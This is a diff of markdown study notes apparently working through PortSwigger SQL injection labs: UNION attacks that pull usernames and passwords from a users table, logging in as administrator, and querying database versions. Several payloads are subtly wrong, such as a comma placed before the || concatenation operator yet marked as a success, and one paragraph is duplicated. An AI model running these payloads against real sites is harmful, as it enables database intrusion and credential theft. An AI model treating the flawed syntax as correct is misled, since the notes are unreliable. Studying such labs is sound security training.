@@ -563,7 +563,7 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 
 ![Error in ORDER BY 3 0.5](images/lab-0.5-union-retrieve-data/error-in-ORDER-BY-3-0.5.png)
 
-![Give UNION SELECT 1,2 and changes values NULL NULL NULL 0.5](images/lab-0.5-union-retrieve-data/change-NULL-0.5.png)
+![Give UNION SELECT 1,2 and changes values NULL NULL0.5](images/lab-0.5-union-retrieve-data/change-NULL-0.5.png)
 
 ![change tables input string 'a','b' 0.5](images/lab-0.5-union-retrieve-data/change-tables-input-string-0.5.png)
 
@@ -608,6 +608,8 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 ' UNION SELECT username, password from users--
 ```
 11. In response HTTP and frontend success get leakked `username` and `password` from tables.
+
+12. Try login users `administrator`
 
 ##### Reference
 
@@ -672,16 +674,179 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 
 >Note: You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
+![access labs 0.6](images/lab-0.6-union-multiple-values/access-lab-0.6.png)
+
+![Open Pets parameter 0.6](images/lab-0.6-union-multiple-values/Open-Pets-parameter-0.6.png)
+
+![intercept and repeater 0.6](images/lab-0.6-union-multiple-values/intercept-and-repeater-0.6.png)
+
+![error 0.6](images/lab-0.6-union-multiple-values/error-0.6.png)
+
+![comment 0.6](images/lab-0.6-union-multiple-values/comments-0.6.png)
+
+![ORDER BY 1 0.6](images/lab-0.6-union-multiple-values/ORDER-BY-1-0.6.png)
+
+![ORDER BY 2 0.6](images/lab-0.6-union-multiple-values/ORDER-BY-2-0.6.png)
+
+![Error in ORDER BY 3 0.6](images/lab-0.6-union-multiple-values/error-in-ORDER-BY-3-0.6.png)
+
+![change tables input string 'a','b' response error 0.6](images/lab-0.6-union-multiple-values/error-change-tables-input-string-0.6.png)
+
+![change tables input string 'null','null' response success 0.6](images/lab-0.6-union-multiple-values/success-change-tables-input-null-0.6.png)
+
+![change tables input string null,'b' response success 0.6](images/lab-0.6-union-multiple-values/success-change-tables-input-string-b-0.6.png)
+
+![check reference sql injection cheatsheet from portswigger](images/lab-0.6-union-multiple-values/portswigger-string-concatenation-reference-0.6.png)
+
+![check reference string concatenation syntax](images/lab-0.6-union-multiple-values/opsgrep-string-concatenation-references-0.6.png)
+
+![retreive union select statment users and password respone error 0.6](images/lab-0.6-union-multiple-values/union-select-statments-error-0.6.png)
+
+![error input string concatenation |](images/lab-0.6-union-multiple-values/error-input-|-string-concatenation-0.6.png)
+
+![success input string concatenation ||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||-string-concatenation-0.6.png)
+
+![error input string concatenation |||](images/lab-0.6-union-multiple-values/error-input-|||-string-concatenation-0.6.png)
+
+![error input string concatenation ||||](images/lab-0.6-union-multiple-values/error-input-||||-string-concatenation-0.6.png)
+
+![success input string concatenation ||''||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||''||-string-concatenation-0.6.png)
+
+![success input string concatenation ||'_'||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||'_'||-string-concatenation-0.6.png)
+
+![success input string concatenation ||'+'||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||'+'||-string-concatenation-0.6.png)
+
+![success input string concatenation ||'~'||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||'~'||-string-concatenation-0.6.png)
+
+![testing login administrator users and password leak](images/lab-0.6-union-multiple-values/login-0.6.png)
+
+![success login administrator users and password](images/lab-0.6-union-multiple-values/success-login-0.6.png)
+
 ##### Tutorial
 
+1. Open Burpsuite  and intercept parameters `Pets`
+2. Intercept request and send to repeater.
+3. Modify to see behaviour request send input `'` have a respone 500 code error.
+4. Modify request send input `'--` for comments have a respone 200 success.
+5. Determine columns that vulnerable query is using `ORDER BY`
 
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+```
+6. Success detect error columns in `ORDER BY 3`
+7. Determine the data type of the columns used `UNION SELECT`
+8. send UNION SELECT for both are data type string `'A' and 'b'` for check validation tables.
+9. Because statment columns find in `3` Try this `UNION SELECT`
+
+```SQL
+' UNION SELECT 'A','B'-- Have error columns a respone give 500
+' UNION SELECT NULL,NULL-- Success determine new columns a respone give 200
+' UNION SELECT 'A',NULL-- Have error columns a respone give 500
+' UNION SELECT  NULL,'B'-- Success to spawn columns 'B'
+```
+9. Check cheatsheet search about String Concatenation
+>Reference:
+>- [SQL Injection Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+>- [SQL concatenation Syntax Reference](https://opsgrep.com/concatenation-in-sql-query/#toc-1-sql-concatenation-syntax-reference)
+10. Input and give a values `UNION SELECT` to retrieve content of `users` table: 
+
+```sql
+' UNION SELECT username, password from users-- Error
+' UNION SELECT username,|password from users-- error
+' UNION SELECT username,||password from users-- success retrieve use operator ||
+' UNION SELECT username,|||password from users-- error
+' UNION SELECT username,|||password from users-- error
+' UNION SELECT username,||||password from users-- error
+' UNION SELECT username,||''||password from users-- success retrieve for open ''
+' UNION SELECT username,||'_'||password from users-- use operator `_`
+' UNION SELECT username,||'+'||password from users-- use operator `+`
+' UNION SELECT username,||'~'||password from users-- use operator `~`
+```
+11. In response HTTP and frontend success get leakked `username` and `password` from tables.
+
+12. Try login users `administrator`
+
+##### Reference
+
+<details>
+<summary> 15. SQL Injection UNION Attack: Retrieving Multiple Values in a Single Column | PortSwigger Lab — Michael Sommer</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=b5spqjjsxnw
+Purpose: In this video we solve the PortSwigger Web Security Academy lab "SQL injection UNION attack, retrieving multiple values in a single column" – a UNION attack where the query only gives us one usable text column, but we want two pieces of data out of it.
+</details>
+
+<details>
+<summary>16. SQL Injection - Lab #6 SQL injection UNION attack, retrieving multiple values in a single column — Rana Khalil</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=yRVYoqR9vrI
+Purpose: In this video, we cover Lab #6 in the SQL injection track of the Web Security Academy. This lab contains a SQL injection vulnerability in the product category field. To solve the lab, we perform a UNION based SQL injection attack that retrieves the usernames and passwords of the users of the application in a single column.
 
 </details>
 
-## Examining the database
+<details>
+<summary> 17. SQL Retrieving Multiple Values in Single Column - String Concatenation in SQL — z3nsh3ll</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=lu_8CT0JwZs
+Purpose: In this video we solve the Burp Suite Web Academy Lab 'SQL Injection Union Attack - Retrieving Multiple Values in a Single Column'.
+</details>
+
+</details>
+
+To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
+
+- The type and version of the database software.
+- The tables and columns that the database contains.
+
 ### Examining the database in SQL injection attacks
+
+To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
+
+- The type and version of the database software.
+- The tables and columns that the database contains.
+
 #### Querying the database type and version
+
+You can potentially identify both the database type and version by injecting provider-specific queries to see if one works
+
+The following are some queries determine the database version for some popular database types:
+
+| Database Type | Query |
+| --- | --- |
+| Microsoft SQL Server | `SELECT @@version` |
+| MySQL | `SELECT @@version` |
+| Oracle | `SELECT * FROM v$version` |
+| PostgreSQL | `SELECT version()` |
+
+For example, you could use a `UNION` attack with the following input:
+```sql
+' UNION SELECT @@version--
+```
+This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:
+```txt
+Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+Mar 18 2018 09:11:49
+Copyright (c) Microsoft Corporation
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+```
+
 ##### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+<details>
+<summary>Lab details, screenshots & walkthrough 0.7</summary>
+
+To solve the lab, display the database version string.
+
+>Note: You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
+
+</details>
+
 #### Listing the contents of the database
 ##### Lab: SQL injection attack, listing the database contents on non-Oracle databases
 
